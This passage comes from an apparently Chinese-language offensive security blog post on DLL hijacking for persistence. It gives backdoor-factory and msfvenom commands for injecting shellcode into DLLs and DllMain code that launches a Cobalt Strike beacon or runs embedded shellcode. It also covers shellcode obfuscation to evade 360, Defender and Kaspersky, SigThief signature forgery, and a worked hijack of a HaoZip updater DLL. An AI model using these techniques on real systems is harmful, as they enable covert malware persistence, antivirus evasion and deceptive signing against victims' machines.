>     **************************************************
>     [*] Total of 2 caves found
>  
这里在.text(代码段)存在一个396字节大小区域.
3.获取可用的payload
`./backdoor.py -f ./exeTest/TestDll.dll -s`
>
>     The following WinIntelPE32s are available: (use -s)
>       cave_miner_inline
>       iat_reverse_tcp_inline
>       iat_reverse_tcp_inline_threaded
>       iat_reverse_tcp_stager_threaded
>       iat_user_supplied_shellcode_threaded
>       meterpreter_reverse_https_threaded
>       reverse_shell_tcp_inline
>       reverse_tcp_stager_threaded
>       user_supplied_shellcode_threaded
>  
这里我们采取最后一个选项:
`user_supplied_shellcode_threaded`
> 自定义payload，payload可通过msf生成
先生成测试的shellcode:
calc调用测试 193bytes：
`msfvenom -p windows/exec CMD=calc.exe -f raw > calc.bin`
msg弹框测试 272bytes:
`msfvenom -p windows/messagebox -f raw >msg.bin`
0x108+8 = 272个字节
不过除了shellcode还有跳转过程也需要字节，平衡栈等。
这里尝试注入:
    ./backdoor.py -f ./exeTest/TestDll.dll -s user_supplied_shellcode_threaded -U msg.bin -a
执行很成功,但是在替换加载的时候,发现计算器的确弹出来了,但是主程序却出错异常退出了。
> 这种方式就是暴力patch程序入口点，jmp shellcode，然后继续向下执行，很容易导致堆栈不平衡,从而导致程序错误，所以，效果不是很好,
> 期待2021.7月发布的新版，有空我也自己去尝试优化下，学学堆栈原理，如何去正确的patch。
###  0x3.3 通用DLL劫持
这种方式可以不再需要导出DLL的相同功能接口，实现原理其实就是修改`LoadLibrary`的返回值,一般来说都是劫持`LoadLibraryW(L"mydll.dll");`,window默认都是转换为unicode,自己去跟一下也可以发现。
原理大概如下:
> exe —load—> fakedlld.ll —> execute shellcode
>
> ​ |执行完返回正确orgin.dll地址|
>
> ​ ——————————————————————
怎么实现这种效果?
使用这个工具:[SuperDllHijack](https://github.com/anhkgg/SuperDllHijack)
    git clone https://github.com/anhkgg/SuperDllHijack.git
然后用vs加载其中的example部分就行了
核心关键代码在这里,这里我们修改成如下:
然后执行的时候,发现虽然成功hook了
但是获取相应的导出函数,也还是失败的, 而且很奇怪realease 和 debug编译的时候,release版本连demo都在win10跑不起来。
###  0x3.4 总结
经过上面的简单测试,
不难得出，无论是从简易性，实用性，操作性(方便免杀)来看，我都推荐新手使用第一种方式，缺点也有，就是可能导出函数比较多的时候，会比较麻烦，但是这些不是什么大问题。因为尽量能用微软提供的功能去解决，远远比自己去patch内存来更有效，可以避免很多隐藏机制，系统版本等问题的影响，通用性得到保证,
所以下面的操作我将会采取AheadLib来进行展示。
## 0x4 DLL后门的利用
DLL查杀,其实也是针对shellcode的查杀,下面先写一个简单的加载shellcode的恶意代码。
###  0x4.1 多文件利用方法
最简单的一种利用手段就是:
存放我的cs木马beacon到一个比较隐蔽的目录:
`C:\Users\xq17\Desktop\shellcode\beacon.exe`
然后给这个文件加一个隐藏属性:
`attrib +h beacon.exe`
接着我们采用DLL去加载这个木马。
代码大概如下:
    ////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
    // 入口函数
    BOOL WINAPI DllMain(HMODULE hModule, DWORD dwReason, PVOID pvReserved)
    {
        if (dwReason == DLL_PROCESS_ATTACH)
        {
            DisableThreadLibraryCalls(hModule);
        }
        else if (dwReason == DLL_PROCESS_DETACH)
        {
            STARTUPINFO si = { sizeof(si) };
            PROCESS_INFORMATION pi;
            CreateProcess(TEXT("C:\\Users\\xq17\\Desktop\\shellcode\\beacon.exe"), NULL, NULL, NULL, false, 0, NULL, NULL, &si, &pi);
        }
        return TRUE;
    }
然后后面直接去尝试加载就行了,程序执行完的时候(`DLL_PROCESS_DETACH`),会自动加载我们的cs马。
>
> 说一下这种方案的好处,就是DLL根本没有恶意操作,所以肯定会免杀，但是你的木马文件要做好免杀，这种思路主要应用于通过劫持一些程序的DLL,然后实现隐蔽的重启上线，也就是权限持续维持，单单杀启动项对DLL进行权限维持的方式来说是没有用的。
###  0x4.2 单DLL自加载上线
上面可能步骤繁琐了些,其实我们也可以直接将shellcode代码写入到DLL文件中,然后加载DLL的时候执行就行了。
代码大概如下:
    ////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
    // 入口函数
    BOOL WINAPI DllMain(HMODULE hModule, DWORD dwReason, PVOID pvReserved)
    {
        if (dwReason == DLL_PROCESS_ATTACH)
        {
            DisableThreadLibraryCalls(hModule);
            unsigned char buf[] = "shellcode";
            size_t size = sizeof(buf);
            char* inject = (char *)VirtualAlloc(NULL, size, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
            memcpy(inject, buf, size);
            CreateThread(0, 0, (LPTHREAD_START_ROUTINE)inject, 0, 0, 0);
        }
        else if (dwReason == DLL_PROCESS_DETACH)
        {
        }
        return TRUE;
    }
    ////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
加载Hello32.exe的时候，就会上线，如果hello32执行完自动退出的话,那也挂掉的(可以写一个自动迁移进程的来解决这个问题)
接下来查看一下杀毒软件报毒不:
一开始静态扫描肯定是可以的,但是当我成功加载上线一次之后，再次查杀立马就被报毒。
后面发现上传鉴定的确也被杀了。(网上很多人说关掉上传(秒天秒地免杀，这里就不做评价了),emmm, 360都是默认开启上传功能的)
现在比较主流的就是自写加载器，加密shellcode之类的，但是效果越来越差了，然后现在慢慢倾向于Python语言、Golang、nim等偏僻语言来调用API，应该是杀软没跟上导致bypass，但是这种技术没办法用在DLL的加载器中，除非用这种偏僻语言来生成DLL。
这里我决定采用一些比较稀奇的方式。
通过注释掉shellcode,不难发现,他是针对shellcode加了特征码来查杀的，云端估计会进行动态分析，然后扫描shellcode然后给shellcode加特征。
> 我的思路是对shellcode进行混淆
实现混淆目前我已知的两种方式:
1.很老很大众的编码器,以前效果贼6的msf也自带的shikata_ga_nai，其原理是内存xor自解密。
2.真正的等价替换shellcode,完全去除本身特征(杀软加针对工具的特征，那就是另说了)
这里我介绍萌新都可以学会使用的第二种方法，原理方面的话，下次再展开与shikata一起来讲讲。
    1.pip install distorm3
    2.git clone https://github.com/kgretzky/python-x86-obfuscator.git
    3.cd
然后cs生成raw的payload.bin,然后生成混淆
`python x86obf.py -i payload.bin -o output.bin -r 0-184`
> 关键一些点还是大致看出来
想要加强混淆，可以执行:
`python x86obf.py -i payload.bin -o output.bin -r 0-184 -p 2 -f 10`
> 可以看到非常恐怖了,基本都不认识了, 但是体积也变大了很多
接着我们直接提取成shellcode的数组形式:
    #!/usr/bin/env python3
    shellcode = 'unsigned char buf[] = "'
    with open("output1.bin", "rb") as f:
        content = f.read()
    # print(content)
    for i in content:
        shellcode += str(hex(i)).replace("0x", "\\x")
    shellcode += '";'
    print(shellcode)
然后直接替换上面的shellcode就行，然后我们再来看一下效果:
> 基本可以免杀,
> 但是如果360上传云，很快就会被杀。解决方案就是:被杀的时候，继续生成和替换shellcode就行了，每次都是随机混淆的，都可以起到免杀效果。
>
> 同时Wd是可以过掉的,卡巴斯基也是可以上线的，但是也仅仅是上线而已。
不过不用很担心免杀问题，毕竟是白+黑，我们劫持有签名的程序就可以降低被杀的概率
就算发出来免杀代码照样会立刻被AV秒杀的，所以目的还是分享一些免杀想法, 希望大家发散思维，形成一套自己的免杀流程。
## 0x5 证书签名伪造
为什么需要伪造证书呢？
**因为有一些情况，一些杀软不会去检验证书签名是否有效，同时也能取到一定迷惑受害者的效果** 。
这里我们使用一个软件[SigThief](https://github.com/secretsquirrel/SigThief):
> 原理:它将从已签名的PE文件中剥离签名，并将其附加到另一个PE文件中，从而修复证书表以对该文件进行签名。
    git clone https://github.com/secretsquirrel/SigThief.git
这里随便选一个微软签名的DLL进行伪造:
.assets/image-20210301124455700.png)
     python3 sigthief.py -i VSTOInstallerUI.dll  -t TestDll.dll -o TestDllSign.dll
不过签名是不正确的(伪造):
     Get-AuthenticodeSignature .\TestDll.dll
> 关于本地修改签名验证机制来bypass，可以参考下这些文章
>
> [数字签名劫持](https://xz.aliyun.com/t/9174)
>
> [Authenticode签名伪造——PE文件的签名伪造与签名验证劫](https://zhuanlan.zhihu.com/p/30157991)
>
> 但是这些点我感觉还是比较粗浅，还需继续深入研究，所以这里就不尝试，因为我觉得应该先从数字签名的原理和验证讲起，后面会慢慢接触到的。
## 0x6 实操DLL持久权限维持
下面用一个案例来组合上面思路。
首先我们下载工具
或者在任务管理器->启动
然后在里面查找一些自动启动的程序。
然后开ProcessMonitor看加载的DLL,这里我默认排除系统的DLL，要不然你的木马会不停被重复加载。
发现进行Load_image,只有这个
发现并不复杂只有一个导出函数:
然后我们生成这个 `Haozip_2345Upgradefake.dll` 文件，将原来DLL改为:`Haozip_2345UpgradeOrg.dll`.
然后继续伪造签名:
    python3 sigthief.py -i Haozip_2345UpgradeOrg.dll  -t Haozip_2345Upgradefake.dll -o Haozip_2345Upgrade.dll
最后将这个两个文件:
    Haozip_2345Upgrade.dll 
    Haozip_2345UpgradeOrg.dll  //这个你也可以直接文件夹直接更换名字就行了。
放回回原来的目录下即可。
但是并没有成功，猜测程序加载DLL的时候检验了签名。
后面我尝试用上面的步骤，寻找了其他office来进行劫持.(这里直接用的是64位没有混淆的shellcode)
成功劫持加载了。
## 0x7 总结
总体来说，这种权限维持方案操作比较复杂，要求也比较高，也相当费时和费力，不过如果手里有很多主流软件的加载DLL列表，然后自己存好备份，能提高不少安装该后门速度，现在就是自动化程度比较低，出错率高，可以继续深入研究下，寻找一种比较简单的指定DLL通用权限维持手段，这样这种技术才能很好的落地实战化。
(共勉吧，Windows的编程和原理还需要继续深入学习…)
## 0x8 参考链接
[dll签名两种方法（转载）](https://blog.csdn.net/blacet/article/details/98631893)
[给.DLL文件加一个数字签名的方法](https://www.cnblogs.com/zjoch/p/4583521.html)
[Use COM Object hijacking to maintain persistence——Hijack
explorer.exe](https://3gstudent.github.io/3gstudent.github.io/Use-COM-Object-hijacking-to-maintain-persistence-Hijack-explorer.exe/)
[一种通用DLL劫持技术研究](https://www.t00ls.net/viewthread.php?tid=48756&extra=&highlight=dll&page=1)
[th-DLL劫持](https://kiwings.github.io/2019/04/04/th-DLL%E5%8A%AB%E6%8C%81/)
[利用BDF向DLL文件植入后门](https://3gstudent.github.io/3gstudent.github.io/%E5%88%A9%E7%94%A8BDF%E5%90%91DLL%E6%96%87%E4%BB%B6%E6%A4%8D%E5%85%A5%E5%90%8E%E9%97%A8/)
[劫持微信dll使木马bypass360重启上线维持权限](http://0x3.biz/2021/01/)
[探索DLL搜索顺序劫持的原理和自动化侦查方法](https://www.anquanke.com/post/id/209563)